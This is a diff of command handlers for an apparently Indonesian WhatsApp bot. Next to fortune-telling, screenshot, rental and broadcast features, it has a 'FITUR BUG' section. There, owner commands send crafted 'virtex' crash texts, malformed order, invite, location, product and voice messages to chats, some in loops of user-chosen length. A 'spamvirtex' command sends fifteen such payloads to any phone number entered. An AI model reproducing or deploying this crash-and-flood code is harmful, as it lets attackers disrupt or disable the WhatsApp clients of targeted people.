+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+case 'ramalanrejeki':
+try{
+if(!q) return setReply("Tanggalnya mana kak Contoh 11-1-2000")
+primbon.rejekiweton(q).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+
+case 'kecocokannama':
+try{
+if(!q) return setReply("Tanggalny mana kak Contoh angel 18-5-20005")
+if(args.length < 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
+if(args.length > 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
+primbon.kecocokannama(args[0], args[1]).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+case 'haribaik':
+try{
+if(!q) return setReply("Tanggalnya mana kak Contoh 1-1-2000")
+primbon.haribaik(q).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+
+
+case 'harilarangan':
+try{
+if(!q) return setReply("Tanggal nya mana kak Contoh 1-1-2000")
+primbon.harilarangan(q).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+
+
+
+
+
+
+
+	
+	
+	
+	
+      
+           
+           
+           
+	
+	
+	
+        
+        
+        
+        
+        
+        
+        
+	
+	
+	
+	
+	
+	
+	
+	
+  
+  
+  
+  
+  
+  
+
+           
+  
+  
+  
+  
+  
+  
+  
+                    case 'readmore':
+			    	case 'more':
+			    	const more = String.fromCharCode(8206)
+			    	const readmore = more.repeat(4001)
+				    if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
+                    const text1 = q.substring(0, q.indexOf('|') - 0)
+                    const text2 = q.substring(q.lastIndexOf('|') + 1)
+                    setReply( text1 + readmore + text2)
+                    break
+  
+  
+  
+  
+  
+ 
+  
+  
+
+
+  
+
+	
+	
+	
+	
+//-------------------------------》FITUR BUG《-------------------------------\\
+	
+case 'kirin':
+      if(isExtream) return
+           if (!isOwner) return onlyOwner()
+                        if (args.length < 1) return reply ('jumlahnya berapa kak')
+				 for (let i = 0; i < args[0]; i++) {
+           xdev.sendMessage(from, {
+                        'groupName': fake,
+                        'groupJid': '6285156137901-1627579259@g.us',
+                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
+                        'inviteExpiration': '0',
+                        'caption': virtex7(prefix),
+                        'jpegThumbnail': davizin,
+                    }, MessageType.groupInviteMessage, { contextInfo: forward
+                    })        
+           }
+           break
+ 
+ 
+ 
+ case 'katsu':
+      if(isExtream) return
+           if (!isOwner) return onlyOwner()
+                        if (args.length < 1) return reply ('jumlahnya berapa kak')
+				 for (let i = 0; i < args[0]; i++) {
+           xdev.sendMessage(from, {
+                            degreesLatitude: 36.036105801662316,
+                              degreesLongitude: 138.09072320256624,
+                            name: virtex7(prefix),
+                               address: virtex6(prefix),
+                             jpegThumbnail: virgam,
+                              }, location,
+                              {contextInfo: forward})
+                             
+           }
+           break
+           
+           
+           case 'kamui':
+                if(isExtream) return
+           if (!isOwner) return onlyOwner()
+                        if (args.length < 1) return reply ('jumlahnya berapa kak')
+				 for (let i = 0; i < args[0]; i++) {
+           var kirin = xdev.prepareMessageFromContent(from, {
+        "imageMessage": {
+                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
+                            "mimetype": "image/jpeg",
+                            "caption": fake,
+                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
+                            "fileLength": "28777",
+                            "height": 1080,
+                            "width": 1079,
+                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
+                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
+                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
+                            "mediaKeyTimestamp": "1610993486",
+                            "jpegThumbnail": virgam,
+                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
+                            }
+                      }, {
+              contextInfo: forward
+                });
+                 xdev.relayWAMessage(kirin)
+                             
+           }
+           break
+ 
+ 
+ 
+ 
+	
+	
+	case 'amaterasu':
+     if(isExtream) return
+      if (!isOwner) return onlyOwner()
+{
+var kirim = xdev.prepareMessageFromContent(from, {
+                    'orderMessage': {
+                        'orderId': '0@s.whatsapp.net',
+                        'thumbnail': virgam,
+                        'itemCount': jumlahTroli,
+                        'status': 1,
+                        'surface': 1,
+                        'message': philip(prefix),
+                        'orderTitle': fake,
+                        'sellerJid': `0@s.whatsapp.net`,
+                      'token': 'ydkskyshj755hfuej',
+                    }
+                }, {
+              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
+                });
+                 xdev.relayWAMessage(kirim)
+                 
+                 
+                 
+         xdev.sendMessage(from, virtex8(prefix), text,  {
+                    'quoted': {
+                        'key': {
+                            'fromMe': false,
+                            'participant': `0@s.whatsapp.net`,
+                            'remoteJid': "0@s.whatsapp.net"
+                        },
+                        'message': {
+                            'orderMessage': {
+                                'itemCount': jumlahTroli,
+                                'status': 1,
+                                'surface': 1,
+                                'message': 'NOPE',
+                                'orderTitle': 'halo gaes',
+                               'thumbnail': virgam,
+                                'sellerJid': "0@s.whatsapp.net"
+                            }
+                        }
+                    },
+                    'contextInfo': {'forwardingScore': 100000000, 'isForwarded': true, 'sendEphemeral': true}
+                })
+                
+                
+                xdev.sendMessage(from, {
+                        'groupName': virtex8(prefix),
+                        'groupJid': '6285156137901-1627579259@g.us',
+                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
+                        'inviteExpiration': '0',
+                        'caption': virtex7(prefix),
+                        'jpegThumbnail': davizin,
+                    }, MessageType.groupInviteMessage, { contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
+                    })        
+                
+                
+                xdev.sendMessage(from, {
+                            degreesLatitude: 36.036105801662316,
+                              degreesLongitude: 138.09072320256624,
+                            name: virtex7(prefix),
+                               address: virtex6(prefix),
+                             jpegThumbnail: virgam,
+                              }, location,
+                              {contextInfo: {forwardingScore: 100000000, isForwarded: true}})
+                             
+                             hmm4 = fs.readFileSync('./stik/fake.jpeg'),
+               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
+                imeg = imeu.message.imageMessage
+                   res = await xdev.prepareMessageFromContent(from, {
+                        'productMessage': {
+                            'product': {
+                           'productImage': imeg,
+                                'productId': '',
+                                'title': virtex8(prefix),
+                                'description': virtex8(prefix),
+                                'priceAmount1000': '1000',
+                                'descriptionCount': 1,
+                                'productImageCount': '1'
+                            },
+                            'businessOwnerJid': `0@s.whatsapp.net`,
+                            'contextInfo': {
+                                'forwardingScore': 100000000,
+                                'isForwarded': true,
+                                'sendEphemeral': true
+                            }
+                        }
+                    }, {
+                  contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
+                    }), 
+                  xdev.relayWAMessage(res)
+                             
+                             
+                             
+                    
+                    const nana = fs.readFileSync('./stik/trava.jpg');
+                        xdev.sendMessage(from, nana, image, {thumbnail: virgam, contextInfo:{ forwardingScore: 100000000, isForwarded: true}});
+                        
+                        
+                        var kirin = xdev.prepareMessageFromContent(from, {
+        "imageMessage": {
+                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
+                            "mimetype": "image/jpeg",
+                            "caption": fake,
+                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
+                            "fileLength": "28777",
+                            "height": 1080,
+                            "width": 1079,
+                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
+                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
+                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
+                            "mediaKeyTimestamp": "1610993486",
+                            "jpegThumbnail": virgam,
+                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
+                            }
+                      }, {
+              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
+                });
+                 xdev.relayWAMessage(kirin)
+                        
+                        
+                    
+ kok = fs.readFileSync('./lib/amaterasu.mp3')
+await xdev.sendMessage(from, kok, audio, {  'quoted': {
+                            'key': {
+                                'participant':  `0@s.whatsapp.net`,
+                                ...'from' ? {
+                                    'remoteJid': '0@s.whatsapp.net'
+                                } : {}
+                            },
+                            'message': {
+                                'orderMessage': {
+                                    'itemCount': jumlahTroli,
+                                    'status': 1,
+                                    'surface': 1,
+                                     'message': 'NOPE',
+                                    'orderTitle': fake,
+                                    'thumbnail': davizin,
+                                    'sellerJid':  '0@s.whatsapp.net'
+                                }
+                            }
+                        }, caption: virtex7(prefix),
+                   
+                })
+             
+                }
+
+break
+           
+           case 'bugv1':
+                if(isExtream) return
+         if (!isOwner) return onlyOwner()
+              {
+                var kirim = xdev.prepareMessageFromContent(from, {
+                    'orderMessage': {
+                        'orderId': '0@s.whatsapp.net',
+                        'thumbnail': virgam,
+                        'itemCount': jumlahTroli,
+                        'status': 1,
+                        'surface': 1,
+                        'message': virtex7(prefix),
+                        'orderTitle': fake,
+                        'sellerJid': `0@s.whatsapp.net`,
+                      'token': 'ydkskyshj755hfuej',
+                    }
+                }, {
+                    'quoted': {
+                        'key': {
+                            'fromMe': false,
+                            'participant': `0@s.whatsapp.net`,
+                            'remoteJid': "0@s.whatsapp.net"
+                        },
+                        'message': {
+                            'orderMessage': {
+                                'itemCount': jumlahTroli,
+                                'status': 1,
+                                'surface': 1,
+                                'message': 'NOPE',
+                                'orderTitle': 'halo gaes',
+                                'sellerJid': "0@s.whatsapp.net"
+                            }
+                        }
+                    },
+                    'contextInfo': forward
+                });
+                 xdev.relayWAMessage(kirim)
+
+                }
+                break;
+                
+             
+                case 'bugv2':
+                     if(isExtream) return
+            if (!isOwner) return onlyOwner()
+                             xdev.sendMessage(from, {
+                            degreesLatitude: 36.036105801662316,
+                              degreesLongitude: 138.09072320256624,
+                            name: virtex7(prefix),
+                               address: virtex6(prefix),
+                             jpegThumbnail: virgam,
+                              }, location,
+                              {contextInfo:forward})
+                            break
+                
+                
+                
+                case 'bugv3':
+                     if(isExtream) return
+                   if (!isOwner) return onlyOwner()
+                xdev.sendMessage(from, `${virtex7(prefix)} `, text, {
+                    'contextInfo': {
+                        'text': '??',
+                        'forwardingScore': 999999999,
+                        'isForwarded': true,
+                        'sendEphemeral': true,
+                        'externalAdReply': {
+                            'title': 'bug',
+                            'body': '',
+                            'previewType': 'PHOTO',
+                            'thumbnail': thumb,
+                            'sourceUrl': ''
+                        }
+                    },
+                    'quoted': {
+                        'key': {
+                            'fromMe': false,
+                            'participant': `0@s.whatsapp.net`,
+                         'remoteJid': '0@s.whatsapp.net'
+                        },
+                        'message': {
+                            'orderMessage': {
+                                'itemCount': jumlahTroli,
+                                'status': 'INQUIRY',
+                                'surface': 'CATALOG',
+                                'message': 'NOPE',
+                                'orderTitle': 'hay',
+                                'thumbnail': davizin,
+                                  'sellerJid': '0@s.whatsapp.net'
+                            }
+                        }
+                    }
+                });
+                break;
+                
+                
+                
+                
+                
+           case 'bugv4':
+                if(isExtream) return
+                    if (!isOwner) return onlyOwner()
+                    if(isGroup) return setReply("Gunakan bug ini di chat")
+           {                
+                    xdev.sendMessage(from, {
+                        'groupName': virtex8(prefix),
+                        'groupJid': '6285156137901-1627579259@g.us',
+                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
+                        'inviteExpiration': '0',
+                        'caption': virtex7(prefix),
+                        'jpegThumbnail': davizin,
+                    }, MessageType.groupInviteMessage, { contextInfo: forward
+                    })             
+                    }
+                    break;
+                    
+           case 'bugv5':
+                if(isExtream) return
+                    if (!isOwner) return onlyOwner()
+           {
+              
+               hmm4 = fs.readFileSync('./stik/fake.jpeg'),
+               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
+                imeg = imeu.message.imageMessage
+                   res = await xdev.prepareMessageFromContent(from, {
+                        'productMessage': {
+                            'product': {
+                           'productImage': imeg,
+                                'productId': '',
+                                'title': virtex8(prefix),
+                                'description': virtex8(prefix),
+                                'priceAmount1000': '1000',
+                                'descriptionCount': 1,
+                                'productImageCount': '1'
+                            },
+                            'businessOwnerJid': `0@s.whatsapp.net`,
+                            'contextInfo': forward
+                        }
+                    }, {
+                  contextInfo: forward
+                    }), 
+                  xdev.relayWAMessage(res)
+                
+                    }
+                    break;
+    
+           case 'bugvn':
+           if(isExtream) return
+                    if (!isOwner) return onlyOwner()
+                iya2 = fs.readFileSync('./lib/amaterasu.mp3')
+                xdev.sendMessage(from, iya2, audio, {
+                    'quoted': {
+                        'key': {
+                            'participant': "0@s.whatsapp.net"
+                        },
+                        'message': {
+                            'orderMessage': {
+                                'itemCount': jumlahTroli,
+                                'status': 1,
+                                'thumbnail': virgam,
+                                'surface': 1,
+                                'message': virtex7(prefix),
+                                'orderTitle': fake,
+                                'sellerJid': "0@s.whatsapp.net",
+                                'sendEphemeral': true,
+                            }
+                        }
+                    },
+                    'filename': '' + ngazap(prefix),
+                    'mimetype': 'audio/mp4',
+                    'duration': '359996400',
+                    'ptt': true
+                });
+                break;
+
+  case 'virtex':
+                if(isExtream) return
+                    if (!isOwner) return onlyOwner()
+           {
+           setReply('*Loading...*')
+               await xdev.sendMessage(from, virtexbytsukasa(prefix), text)                
+               await xdev.sendMessage(from, virtex(prefix), text)            
+                await xdev.sendMessage(from, virtex2(prefix), text)       
+                 await xdev.sendMessage(from, virtex3(prefix), text)    
+                await xdev.sendMessage(from, virtex4(prefix), text)              
+                await xdev.sendMessage(from, virtex5(prefix), text)     
+                await xdev.sendMessage(from, virtex6(prefix), text)
+                await xdev.sendMessage(from, virtex7(prefix), text)   
+                await xdev.sendMessage(from, virtex8(prefix), text)            
+                await xdev.sendMessage(from, virtex9(prefix), text)       
+                 await xdev.sendMessage(from, virtex10(prefix), text)    
+                await xdev.sendMessage(from, virtex11(prefix), text)              
+                await xdev.sendMessage(from, virtex12(prefix), text)     
+                await xdev.sendMessage(from, philip(prefix), text)
+                 await xdev.sendMessage(from, slayer(prefix), text) 
+                 await xdev.sendMessage(from, ngazap(prefix), text)
+           }
+                break;
+           
+           
+           
+           
+           
+           
+           
+           
+          
+           
+           case 'spamvirtex':    
+              //  if(isExtream) return
+                   if (!isOwner) return onlyOwner()
+                     try {                 
+                     setReply('*Loading...*')
+                    if (args.length < 1) return setReply(`Penggunaan ${prefix}spamvirtex nomor`)
+					if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
+			       woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+					var nilaiAwal = 1;
+                    while(nilaiAwal <= 3) { 
+                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex7(prefix), text, {contextInfo: forward})
+                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex6(prefix), text, {contextInfo: forward})
+                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, ngazap(prefix), text, {contextInfo: forward})
+                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, philip(prefix), text, {contextInfo: forward})
+                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtexbytsukasa(prefix), text, {contextInfo: forward})
+                     nilaiAwal++}
+					await xdev.sendMessage(from, `*Sukses send virtex sebanyak 15 virtex ke nomor ${q}*`, text, {quoted : dev})
+					} catch (e) {
+					console.log('Error :', e)
+					setReply(`*Gagal mengirim virtex, System error pastikan memasukan nomer whatsapp dengan benar*`)
+					}                        
+					break
+      
+           
+           
+           case 'ssweb':
+            case 'ss':
+            if(!q) return setReply("Masukan Link")
+            if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
+                if (args.length < 1) return setReply('Urlnya mana om')
+					teks = q
+					ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
+					buff = await getBuffer(ana.screenshot)
+					xdev.sendMessage(from, buff, image, {quoted: dev, caption : teks})
+					break
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+//-------------------------------》FITUR OWNER《-------------------------------\\     
+           
+           case 'addorder':
+            try{
+           if (!isOwner) return onlyOwner()
+            if (args.length < 1) return setReply(`Penggunaan :\n${prefix}addorder linkgc 60s\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
+            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
+            if (!q) return setReply('masukan link gcnya kak')
+            
+             var LinkGc = q.split(" ")[0];
+            var Second = q.split(" ")[1];
+           
+            var net = LinkGc.split('https://chat.whatsapp.com/')[1]
+            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
+            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
+            json: ["query", "invite",net],
+            expect200:true })
+           if(_sewa.checkSewaGroup(id, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
+              if(!isGroup){            
+                          let code = LinkGc.replace('https://chat.whatsapp.com/', '')
+                          xdev.acceptInvite(code)                                   
+                          } else {
+                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
+                            link = LinkGc.replace('https://chat.whatsapp.com/','')
+                            fak = xdev.query({ json: ['action', 'invite', link],
+                            expect200: true })                        
+                            }                          
+                            await setReply(`Sukses join kak`)
+                              
+                        _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
+                       await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
+                            }catch (err){
+					      console.log(err)
+					       return setReply("Link Error")
+					       }
+                           break
+             
+        
+        
+        case 'freeoneday':
+            try{
+            if (!q) return setReply('Masukan link gcnya kak')
+            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply("Linknya betul ga tuh")
+            cos = args[0]
+            var net = cos.split('https://chat.whatsapp.com/')[1]
+            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
+            jids = []
+            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
+            json: ["query", "invite",net],
+            expect200:true })
+            if(!isGroup){            
+                          let code = args[0].replace('https://chat.whatsapp.com/', '')
+                          xdev.acceptInvite(code)                                   
+                          } else {
+                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
+                            link = args[0].replace('https://chat.whatsapp.com/','')
+                            fak = xdev.query({ json: ['action', 'invite', link],
+                            expect200: true })                        
+                            }                          
+                            await setReply(`Oke aku udah join :)`)
+                            await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`,`*「 freeoneday 」*\n\nHalo kak, ada yang sewa aku nih\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nLink Gc : \n\n${q}\n\nCommand :\n${prefix}${command}\n\n\n© ${fake1}\n${calender}\n`,text)                                         
+                             _sewa.addSewaGroup(id, subject, q, "1d", sewa)
+                            await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
+                            }catch (err){
+					      console.log(err)
+					       return setReply("Link Error")
+					       }
+                           break
+        
+        
+        
+        
+        
+        
+                 
+                 
+                 case 'autolevel':
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (autoLevel) return setReply('Sudah aktif kak')
+                    autoLevel = true
+                    setReply("Sukses mengaktifkan auto level!");
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (!autoLevel) return setReply('Sudah Mati')
+                    autoLevel = false
+                    setReply("Sukses mematikan auto level!");
+					} else if (!q) {
+                      sendButMessage(from, `MODE AUTO LEVEL`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+                 
+                 
+                 case 'nsfw':
+                  if(!isGroup) return setReply("Hanya bisa di group")
+                    if(isExtream) return
+			        if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
+			        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (checkDataId ("nsfw", from, DataId) ) return setReply('Sudah aktif kak')
+                    addDataId(from, command, DataId)
+                    setReply("Nsfw telah di di aktifkan")
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (!checkDataId ("nsfw", from, DataId) ) return setReply('Sudah Mati')
+                    removeDataId (command, from, DataId)
+                    setReply("Nsfw telah di matikan")
+					} else if (!q) {
+                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}nsfw on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}nsfw off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+        
+                 
+           
+           case 'antitroli':
+            if(!isGroup) return setReply("Hanya bisa di group")
+                    if(isExtream) return
+					if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (antibugtroli === true) return setReply('Sudah aktif kak')
+                    antibugtroli = true
+                    let ah =`Mode anti bugtroli aktif kak`
+                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (antibugtroli === false) return setReply('Udah off kak')
+                     antibugtroli = false
+                     let uh =`Mode anti bugtroli di matikan`
+                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
+					} else if (!q) {
+                      sendButMessage(from, `MODE ANTI BUGTROLI`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}antitroli on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}antitroli off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+           
+           
+           case 'antilink':
+    if (!isGroupAdmins) return sendSticker(hanyaadmin)
+					if (!isGroup) return setReply('hanya bisa di group')
+					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+						if (isAntiLink) return setReply('Fitur sudah aktif kak')
+						addDataId(from, command, DataId)
+						let ih =`Fitur antilink telah di aktifkan`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+						if (!isAntiLink) return setReply('Udah mati')
+						removeDataId (command, from, DataId)
+						let ih =`Fitur antilink telah di matikan`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+           
+           
+           
+           
+                 
+                 
+                 case 'forward':
+					       if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (forwarding === true) return setReply('Udah aktif kak')
+                    forwarding = true
+                    let ah =`Mode forwarding/diteruskan berhasil diaktifkan \nsilakan ketik ${prefix}menu untuk melihat perbedaanya`
+                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (forwarding === false) return setReply('Udah off kak')
+                     forwarding = false
+                     let uh =`Mode forwarding telah di matikan`
+                     xdev.sendMessage(from, uh, text, { quoted: setQuoted})
+					} else if (!q) {
+                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}forwarding on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}forwarding off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+           
+           
+     
+	
+	
+           
+           
+           case 'bc':
+           
+					if (!isOwner && !dev.key.fromMe) return onlyOwner()
+					if (args.length < 1) return setReply('Teksnya?')
+					await setReply(`*Loading...*`)
+					anus = await xdev.chats.all()
+					let butonih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
+                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
+					
+					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
+						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
+						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+					} else {
+						for (let _ of anus) {
+							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),butonih)
+						}
+						await setReply(`Sukses mengirim Broadcast:\n${q}`)
+					}
+					break
+					
+					
+					
+					case 'bcpc':
+					if (!isOwner && !dev.key.fromMe) return onlyOwner()
+					if (args.length < 1) return setReply('Teksnya?')
+					await setReply(`*Loading...*`)
+					anus = await xdev.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
+					let ohyeah = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
+                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
+					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
+						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
